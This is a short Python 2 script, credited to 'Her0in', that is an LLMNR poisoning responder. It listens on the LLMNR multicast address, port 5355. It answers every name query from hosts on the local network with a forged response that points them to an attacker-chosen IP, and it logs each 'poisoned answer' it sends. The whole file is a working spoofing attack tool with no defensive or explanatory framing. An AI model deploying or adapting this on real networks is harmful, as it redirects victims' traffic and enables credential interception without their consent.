#/usr/bin/env python

__doc__ = """

    LLMNR Answer ,
                    by Her0in

"""

import socket, struct

class LLMNR_Answer:
    def __init__(self, addr):

        self.IPADDR  = addr
        self.las = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.init_socket()
        self.populate()
    def populate(self):

        self.AnswerData = (
            "TID"               # Tid
            "\x80\x00"          # Flags  Query(0x0000)? or Response(0x8000) ?
            "\x00\x01"          # Question
            "\x00\x01"          # Answer RRS
            "\x00\x00"          # Authority RRS
            "\x00\x00"          # Additional RRS
            "LENGTH"            # Question Name Length
            "NAME"              # Question Name
            "\x00"              # Question Name Null
            "\x00\x01"          # Query Type ,IPv4(0x0001)? or IPv6(0x001c)?
            "\x00\x01"          # Class
            "LENGTH"            # Answer Name Length
            "NAME"              # Answer Name
            "\x00"              # Answer Name Null
            "\x00\x01"          # Answer Type ,IPv4(0x0001)? or IPv6(0x001c)?
            "\x00\x01"          # Class
            "\x00\x00\x00\x1e"  # TTL Default:30s
            "\x00\x04"          # IP Length
            "IPADDR")           # IP Address

    def init_socket(self):
        self.HOST = "0.0.0.0"
        self.PORT = 5355
        self.MulADDR  = "224.0.0.252"
        self.las.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.las.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
        self.las.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP,
                       socket.inet_aton(self.MulADDR) + socket.inet_aton(self.HOST))

    def Answser(self):
        self.las.bind((self.HOST, self.PORT))
        print "Listening..."
        while True:
            data, addr = self.las.recvfrom(1024)

            tid = data[0:2]
            namelen = struct.unpack('>B', data[12])[0]
            name = data[13:13 + namelen]

            data = self.AnswerData.replace('TID', tid)
            data = data.replace('LENGTH', struct.pack('>B', namelen))
            data = data.replace('NAME', name)
            data = data.replace('IPADDR', socket.inet_aton(self.IPADDR))

            print "Poisoned answer(%s) sent to %s for name %s " % (self.IPADDR, addr[0], name)
            self.las.sendto(data, addr)

        self.las.setsockopt(socket.IPPROTO_IP, socket.IP_DROP_MEMBERSHIP,
                       socket.inet_aton(self.MulADDR) + socket.inet_aton(self.HOST))
        self.las.close()

if __name__ == "__main__":
    llmnr = LLMNR_Answer("11.22.33.44")
    llmnr.Answser()
